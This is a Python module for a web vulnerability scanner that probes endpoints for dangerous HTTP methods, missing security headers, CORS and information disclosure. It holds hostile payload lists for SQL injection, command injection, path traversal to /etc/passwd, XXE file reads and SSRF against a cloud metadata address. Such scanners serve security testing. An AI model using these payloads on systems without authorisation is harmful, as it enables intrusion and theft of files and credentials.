import requests
import logging
import json
import time
from typing import Dict, List, Set, Optional, Any
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from .payloads import COMMON_PARAMETERS, CONTENT_TYPES, HTTP_METHODS
from output.formatter import OutputFormatter

logger = logging.getLogger(__name__)

class VulnerabilityCheckConfig:
    """Configuration for vulnerability checks"""
    def __init__(self, **kwargs):
        # HTTP Method Checks
        self.check_dangerous_methods = kwargs.get('check_dangerous_methods', True)
        self.dangerous_methods = kwargs.get('dangerous_methods', ['PUT', 'DELETE', 'TRACE'])
        
        # Injection Checks
        self.check_sql_injection = kwargs.get('check_sql_injection', True)
        self.check_command_injection = kwargs.get('check_command_injection', True)
        self.check_path_traversal = kwargs.get('check_path_traversal', True)
        self.check_xxe = kwargs.get('check_xxe', True)
        self.check_ssrf = kwargs.get('check_ssrf', True)
        
        # Authentication/Authorization
        self.check_auth_bypass = kwargs.get('check_auth_bypass', True)
        self.check_broken_access = kwargs.get('check_broken_access', True)
        
        # Configuration Issues
        self.check_misconfigurations = kwargs.get('check_misconfigurations', True)
        self.check_debug_endpoints = kwargs.get('check_debug_endpoints', True)
        self.check_information_disclosure = kwargs.get('check_information_disclosure', True)
        
        # Risk Level
        self.risk_level = kwargs.get('risk_level', 'medium')  # low, medium, high
        
        # Timeouts and Limits
        self.request_timeout = kwargs.get('request_timeout', 10)
        self.max_retries = kwargs.get('max_retries', 3)

class FuzzingAnalyzer:
    """Enhanced fuzzing analyzer with configurable vulnerability checks"""
    
    def __init__(self, session: requests.Session, formatter: OutputFormatter, config: Optional[Dict] = None):
        self.session = session
        self.formatter = formatter
        self.config = VulnerabilityCheckConfig(**(config or {}))
        self.results: Dict[str, Dict] = {}
        self.vulnerabilities: List[Dict] = []
        self._reported_vulns = set()
        self._endpoint_methods = {}

        # Payloads for different types of attacks
        self.sql_payloads = [
            "' OR '1'='1",
            "1 UNION SELECT NULL--",
            "1; SELECT SLEEP(5)--",
            "admin' --",
            "1' ORDER BY 1--",
            ") UNION SELECT NULL,NULL,NULL,NULL--",
            "' WAITFOR DELAY '0:0:5'--",
            "1; EXEC xp_cmdshell('ping 10.10.10.10')",
        ]
        
        self.command_payloads = [
            "| ping -c 5 127.0.0.1",
            "; sleep 5",
            "` sleep 5 `",
            "$(sleep 5)",
            "& ping -n 5 127.0.0.1 &",
            "| net user",
            "; cat /etc/passwd",
            "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
        ]
        
        self.path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "/..././..././etc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
        ]
        
        self.xxe_payloads = [
            """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>""",
            """<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "http://127.0.0.1:8080/test.dtd">]><data>&file;</data>""",
            """<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">%eval;%error;]><data>test</data>""",
        ]
        
        self.ssrf_payloads = [
            "http://127.0.0.1:80",
            "http://localhost:22",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::]:22",
            "file:///etc/passwd",
            "dict://localhost:11211/",
        ]

    def _get_base_endpoint(self, url: str) -> str:
        """Get base endpoint path for grouping"""
        try:
            parsed = urlparse(url)
            path = parsed.path
            parts = path.strip('/').split('/')
            
            # Remove file extensions and versions
            cleaned_parts = []
            for part in parts:
                # Remove file extensions
                part = part.split('.')[0]
                # Skip version numbers
                if not (part.startswith('v') and part[1:].isdigit()):
                    cleaned_parts.append(part)
            
            base_path = '/'.join(cleaned_parts)
            return base_path if base_path else 'root'
            
        except Exception as e:
            logger.error(f"Error getting base endpoint for {url}: {str(e)}")
            return 'unknown'

    def _add_vulnerability(self, url: str, vuln_type: str, severity: str, details: Dict):
        """Add a vulnerability finding with deduplication"""
        vuln_key = f"{url}:{vuln_type}:{json.dumps(details, sort_keys=True)}"
        
        if vuln_key not in self._reported_vulns:
            vulnerability = {
                'url': url,
                'type': vuln_type,
                'severity': severity,
                'details': details,
            }
            
            # Check risk level configuration
            should_report = (
                (self.config.risk_level == 'low') or
                (self.config.risk_level == 'medium' and severity != 'LOW') or
                (self.config.risk_level == 'high' and severity == 'HIGH')
            )
            
            if should_report:
                self.vulnerabilities.append(vulnerability)
                self._reported_vulns.add(vuln_key)
                
                if severity == 'HIGH':
                    print(self.formatter.error(
                        f"\n[!] High Severity Finding:"
                        f"\n    Type: {vuln_type}"
                        f"\n    URL: {url}"
                        f"\n    Details: {json.dumps(details, indent=4)}"
                    ))
                else:
                    print(self.formatter.warning(
                        f"[!] [{severity}] {vuln_type} detected on {url}"
                    ))

    def _test_http_methods(self, url: str) -> List[str]:
        """Test HTTP methods with enhanced checks"""
        allowed_methods = []
        base_url = self._get_base_endpoint(url)
        
        if base_url not in self._endpoint_methods:
            print(self.formatter.info(f"\nTesting methods for endpoint: {base_url}"))
            self._endpoint_methods[base_url] = set()
        
        for method in HTTP_METHODS:
            if method in self._endpoint_methods[base_url]:
                continue
                
            try:
                response = self.session.request(method, url, timeout=self.config.request_timeout)
                is_allowed = response.status_code != 405
                
                if is_allowed:
                    allowed_methods.append(method)
                    self._endpoint_methods[base_url].add(method)
                    
                    if response.status_code < 400:
                        print(self.formatter.info(
                            f"    ╰─> {method} allowed ({response.status_code})"
                        ))
                    
                    # Check for dangerous methods
                    if self.config.check_dangerous_methods and method in self.config.dangerous_methods:
                        self._add_vulnerability(url, f'dangerous_method_{method.lower()}', 'MEDIUM', {
                            'method': method,
                            'status_code': response.status_code
                        })
                    
                    # Check response for various issues
                    self._check_response_issues(url, method, response)
                    
            except requests.RequestException as e:
                logger.warning(f"Request error testing {method} on {url}: {str(e)}")
                
        return allowed_methods

    def _check_response_issues(self, url: str, method: str, response: requests.Response):
        """Check response for various security issues"""
        try:
            response_text = response.text.lower()
            headers = response.headers
            
            # Check for information disclosure
            if self.config.check_information_disclosure:
                self._check_information_disclosure(url, response_text, headers)
            
            # Check for debug endpoints
            if self.config.check_debug_endpoints:
                self._check_debug_information(url, response_text)
            
            # Check for misconfigurations
            if self.config.check_misconfigurations:
                self._check_misconfigurations(url, method, headers)
            
        except Exception as e:
            logger.error(f"Error checking response issues: {str(e)}")

    def _check_information_disclosure(self, url: str, response_text: str, headers: Dict):
        """Check for information disclosure issues"""
        # Check for sensitive information in response
        sensitive_patterns = [
            ('error_disclosure', ['error', 'exception', 'stacktrace', 'syntax error']),
            ('version_disclosure', ['version:', 'v1.', 'v2.', 'build:']),
            ('path_disclosure', ['c:\\', '/var/www/', '/usr/local/']),
            ('email_disclosure', ['@gmail.com', '@yahoo.com', '@company.com']),
            ('api_key_disclosure', ['api_key', 'apikey', 'api-key', 'access_key']),
        ]
        
        for issue_type, patterns in sensitive_patterns:
            if any(pattern in response_text for pattern in patterns):
                self._add_vulnerability(url, issue_type, 'LOW', {
                    'evidence': next(p for p in patterns if p in response_text)
                })
        
        # Check headers for sensitive information
        sensitive_headers = [
            'server',
            'x-powered-by',
            'x-aspnet-version',
            'x-runtime',
        ]
        
        for header in sensitive_headers:
            if header in headers:
                self._add_vulnerability(url, 'header_disclosure', 'LOW', {
                    'header': header,
                    'value': headers[header]
                })

    def _check_debug_information(self, url: str, response_text: str):
        """Check for debug information"""
        debug_patterns = [
            'debug=true',
            'development mode',
            'staging environment',
            'debug mode enabled',
            'console.log(',
            'eval(',
            'localhost',
        ]
        
        for pattern in debug_patterns:
            if pattern in response_text:
                self._add_vulnerability(url, 'debug_information', 'LOW', {
                    'pattern': pattern
                })

    def _check_misconfigurations(self, url: str, method: str, headers: Dict):
        """Check for security misconfigurations"""
        # Check CORS configuration
        if 'access-control-allow-origin' in headers:
            if headers['access-control-allow-origin'] == '*':
                self._add_vulnerability(url, 'cors_misconfiguration', 'MEDIUM', {
                    'header': 'access-control-allow-origin: *'
                })
        
        # Check security headers
        security_headers = [
            'strict-transport-security',
            'x-content-type-options',
            'x-frame-options',
            'x-xss-protection',
        ]
        
        missing_headers = [h for h in security_headers if h not in headers]
        if missing_headers:
            self._add_vulnerability(url, 'missing_security_headers', 'LOW', {
                'missing_headers': missing_headers
            })

    def fuzz_endpoint(self, url: str) -> Dict[str, Any]:
        """Perform comprehensive fuzzing on a single endpoint"""
        logger.info(f"Starting fuzzing for endpoint: {url}")
        try:
            endpoint_results = {
                'url': url,
                'methods_allowed': [],
                'vulnerabilities': []
            }
            
            # Test HTTP methods
            endpoint_results['methods_allowed'] = self._test_http_methods(url)
            
            # Store results
            self.results[url] = endpoint_results
            return endpoint_results
            
        except Exception as e:
            logger.error(f"Error fuzzing endpoint {url}: {str(e)}")
            raise

    def fuzz_endpoints_concurrent(self, urls: List[str], threads: int = 5) -> Dict[str, Any]:
        """Fuzz multiple endpoints concurrently"""
        logger.info(f"Starting concurrent fuzzing of {len(urls)} endpoints")
        try:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = [
                    executor.submit(self.fuzz_endpoint, url)
                    for url in urls
                ]
                
                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception as e:
                        logger.error(f"Error in fuzzing task: {str(e)}")
            
            return self.get_results()
            
        except Exception as e:
            logger.error(f"Error during concurrent fuzzing: {str(e)}")
            raise

    def get_results(self) -> Dict[str, Any]:
        """Get complete fuzzing results with organized summary"""
        try:
            # Group vulnerabilities by severity and type
            vuln_by_severity = {'HIGH': [], 'MEDIUM': [], 'LOW': []}
            vuln_by_type = {}
            
            for vuln in self.vulnerabilities:
                vuln_by_severity[vuln['severity']].append(vuln)
                
                if vuln['type'] not in vuln_by_type:
                    vuln_by_type[vuln['type']] = []
                vuln_by_type[vuln['type']].append(vuln)
            
            # Print organized summary
            total_vulns = len(self.vulnerabilities)
            if total_vulns > 0:
                print(self.formatter.info(f"\nFuzzing Summary:"))
                print(f"Total vulnerabilities found: {total_vulns}")
                print(f"  HIGH: {len(vuln_by_severity['HIGH'])}")
                print(f"  MEDIUM: {len(vuln_by_severity['MEDIUM'])}")
                print(f"  LOW: {len(vuln_by_severity['LOW'])}")
                
                # Print high severity findings summary
                if vuln_by_severity['HIGH']:
                    print(self.formatter.error("\nHigh Severity Findings Summary:"))
                    for vuln in vuln_by_severity['HIGH']:
                        print(f"  - {vuln['type']} in {vuln['url']}")
            
            return {
                'endpoint_results': self.results,
                'vulnerabilities': sorted(
                    self.vulnerabilities,
                    key=lambda x: {'HIGH': 0, 'MEDIUM': 1, 'LOW': 2}[x['severity']]
                ),
                'summary': {
                    'total_vulnerabilities': total_vulns,
                    'by_severity': {
                        severity: len(vulns)
                        for severity, vulns in vuln_by_severity.items()
                    },
                    'by_type': {
                        vuln_type: len(vulns)
                        for vuln_type, vulns in vuln_by_type.items()
                    }
                }
            }
        except Exception as e:
            logger.error(f"Error getting results: {str(e)}")
            raise